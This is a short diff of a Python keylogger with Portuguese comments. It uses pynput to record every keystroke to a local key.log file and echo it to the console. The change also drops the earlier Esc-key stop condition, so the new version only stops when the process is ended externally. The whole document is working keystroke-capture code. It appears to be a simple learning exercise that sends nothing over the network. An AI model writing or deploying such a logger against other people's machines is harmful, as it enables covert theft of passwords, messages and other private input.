@@ -1,21 +1,20 @@
-from pynput import keyboard
+#bibliotecas:
+from pynput.keyboard import Listener
+import re
+import os
 
-#criando o arquivo de log "registro.txt":
-def ao_pressionar(tecla):
-    try:
-        with open("registro.txt", "a") as arquivo_log:
-            arquivo_log.write(f"{tecla.char}")
-    except AttributeError:
-        with open("registro.txt", "a") as arquivo_log:
-            arquivo_log.write(f"{tecla}")
+#criação do arquivo de log:
+arquivoLog = f'{os.getcwd()}/key.log'
 
-#parar a leitura:
-def ao_soltar(tecla):
-    if tecla == keyboard.Key.esc:
-        return False
+#criação da função de leitura:
+def capturar(tecla):
+    tecla = str(tecla)
+    tecla = re.sub(r'\'', '', tecla)
+    tecla = re.sub(r'Key.space', " ", tecla)
+    tecla = re.sub(r'Key.enter', '\n', tecla)
+    print(tecla, end='')
+    with open(arquivoLog, "a") as log:
+        log.write(tecla)
 
-#recebe as teclas:
-with keyboard.Listener(
-        on_press=ao_pressionar,
-        on_release=ao_soltar) as leitura:
-    leitura.join()
+with Listener(on_press=capturar) as l:
+    l.join()
